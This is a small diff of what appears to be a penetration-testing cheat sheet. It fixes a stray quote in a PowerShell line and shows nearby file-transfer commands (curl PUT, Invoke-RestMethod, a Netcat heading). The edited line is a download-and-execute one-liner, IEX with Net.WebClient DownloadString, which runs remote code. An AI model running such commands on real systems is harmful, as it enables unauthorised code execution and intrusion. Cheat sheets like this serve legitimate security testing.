@@ -22,7 +22,7 @@ Uploading a file with PUT: <code>curl -X PUT http://[IP]/[FILE] -d @[FILE]  -v</
 
 <code>powershell Invoke-RestMethod -Uri '[URL]' -OutFile '[PATH\TO\FILE\]'</code>
 
-<code>powershell IEX(New-Object Net.WebClient).DownloadString('[URL]')"</code>
+<code>powershell IEX(New-Object Net.WebClient).DownloadString('[URL]')</code>
 
 ### Upload / Download Files with Netcat
 
